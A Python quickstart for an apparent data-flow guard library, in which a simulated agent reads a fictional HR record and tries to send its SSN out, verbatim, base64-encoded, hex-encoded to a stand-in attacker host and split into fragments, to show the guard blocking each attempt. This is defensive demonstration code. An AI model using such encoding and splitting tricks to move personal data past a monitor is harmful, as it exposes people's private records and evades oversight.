"""Runs offline, no API key: an 'agent' reads an HR record, then tries to leak the SSN.

    python examples/quickstart.py
"""

import base64
from pathlib import Path

from flowguard import FlowBlocked, Guard, Policy, hostname

policy = Policy.from_file(Path(__file__).with_name("policy.yaml"))
guard = Guard(policy)


# 1. Mark the tool that reads sensitive data as a *source*...
@guard.source("hr.get_employee")
def get_employee(emp_id: str) -> dict:
    return {
        "id": emp_id,
        "name": "Kim Min-jun",
        "department": "Engineering",
        "email": "minjun.kim@corp.example",
        "salary": 85000,
        "ssn": "123-45-6791",
    }


# 2. ...and every tool that sends data out as a *sink*. The destination is derived
#    from the call itself, so the policy decides per host.
@guard.sink(lambda url: hostname(url))
def http_post(url: str, body: str) -> str:
    return f"200 OK -> {url}"


def attempt(label: str, url: str, body: str) -> None:
    try:
        print(f"  ALLOWED  {label:<34} {http_post(url, body)}")
    except FlowBlocked as blocked:
        print(f"  BLOCKED  {label:<34} {blocked}")


emp = get_employee("E011")
ssn = emp["ssn"]
partner = "https://partner-sync.example.com/api"  # CONFIDENTIAL in policy.yaml
attacker = "https://collector.evil.test/upload"  # not in the policy -> PUBLIC only

print("Legitimate use")
attempt("name + department to partner", partner, f"{emp['name']} / {emp['department']}")
attempt("email to partner (CONFIDENTIAL ok)", partner, emp["email"])

print("\nThe agent tries to leak the SSN")
attempt("verbatim to partner", partner, f"ssn={ssn}")
attempt("base64 to partner", partner, base64.b64encode(ssn.encode()).decode())
attempt("hex to unknown host", attacker, ssn.encode().hex())
attempt("fragment 1 of 2 (piece by itself)", partner, ssn[:6])
attempt("fragment 2 of 2 completes it", partner, ssn[6:])

print("\nAudit trail (no payloads, no values):")
for event in guard.audit.events:
    if not event["allowed"]:
        f = event["findings"][0]
        via = f" via {f['via']}" if f["via"] else ""
        print(f"  {event['destination']:<26} {f['level']:<17} from {f['origin']}{via}")
